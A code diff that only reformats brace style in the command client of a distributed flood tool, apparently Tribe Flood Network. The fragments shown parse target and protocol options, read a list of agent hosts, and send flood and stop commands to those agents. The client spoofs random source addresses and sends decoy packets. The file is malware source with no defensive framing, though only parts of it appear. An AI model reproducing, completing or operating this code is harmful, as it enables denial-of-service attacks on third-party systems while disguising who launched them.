@@ -42,8 +42,7 @@ int main (int argc, char **argv) {
         usage (argv[0]);
 
     while ((opt = getopt (argc, argv, "P:D:S:f:h:i:p:c:")) != EOF)
-        switch (opt)
-        {
+        switch (opt) {
             case 'P':
                 if (strcasecmp (optarg, "icmp") == 0)
                     proto = 0;
@@ -59,8 +58,7 @@ int main (int argc, char **argv) {
                 myip = resolve (optarg);
                 break;
             case 'f':
-                if ((tfnlist = fopen (optarg, "r")) == NULL)
-                {
+                if ((tfnlist = fopen (optarg, "r")) == NULL) {
                     printf ("Unable to open file: %s\n", optarg);
                     usage (argv[0]);
                 }
@@ -87,8 +85,7 @@ int main (int argc, char **argv) {
     printf ("[0;35m\n");
 
     printf ("\tProtocol      : ");
-    switch (proto)
-    {
+    switch (proto) {
         case 0:
             printf ("icmp\n");
             break;
@@ -120,14 +117,12 @@ int main (int argc, char **argv) {
 
     if (port != NULL)
         printf ("\tTCP port      : %d\n", atoi (port));
-    else if (cid == 5)
-    {
+    else if (cid == 5) {
         port = malloc (BS);
         strcpy (port, "0");
     }
 
-    if (target != NULL)
-    {
+    if (target != NULL) {
         if ((cid > 4) && (cid != 10))
             printf ("\tTarget(s)     : %s\n", target);
     }
@@ -135,13 +130,11 @@ int main (int argc, char **argv) {
         usage (argv[0]);
 
     printf ("\tCommand       : ");
-    switch (cid)
-    {
+    switch (cid) {
         case 0:
             RID = ID_STOPIT;
             printf ("stop flooding\n");
-            if (target == NULL)
-            {
+            if (target == NULL) {
                 target = malloc (BS);
                 strcpy (target, "0");
             }
@@ -205,10 +198,8 @@ int main (int argc, char **argv) {
     if (tfnlist == NULL)
         tfn_sendto (tfnhost);
     else
-        while (fgets (nexthost, 512, tfnlist) != NULL)
-        {
-            switch (nexthost[0])
-            {
+        while (fgets (nexthost, 512, tfnlist) != NULL) {
+            switch (nexthost[0]) {
                 case '\n':
                 case '\r':
                 case ' ':
@@ -240,8 +231,7 @@ void passchk (void) {
     aes_setkey (p);
     encode64 (test2, enc2, strlen (test2));
 
-    if (strcmp (enc1, enc2))
-    {
+    if (strcmp (enc1, enc2)) {
         fprintf (stderr, "Sorry, passwords do not match.\n");
         fprintf (stderr, "1 %s\n2 %s\n", enc1, enc2);
         exit (0);
@@ -254,10 +244,8 @@ void tfn_sendto (unsigned long dst) {
     char ltarget[BS], lport[BS];
     unsigned long src = myip ? myip : k00lip ();
 
-    for (i = 0; i < RETRY; i++)
-    {
-        if (cid == 5)
-        {
+    for (i = 0; i < RETRY; i++) {
+        if (cid == 5) {
             strcpy (lport, port);
             tfntransmit (src, dst, proto, ID_SYNPORT, lport);
             usleep (666);
@@ -265,8 +253,7 @@ void tfn_sendto (unsigned long dst) {
         strcpy (ltarget, target);
         tfntransmit (src, dst, proto, RID, ltarget);
         if (decoy)
-            for (j = 0; j < decoy; j++)
-            {
+            for (j = 0; j < decoy; j++) {
                 usleep (10);
                 strcpy (ltarget, target);
                 tfntransmit (src, k00lip (), proto, RID, ltarget);
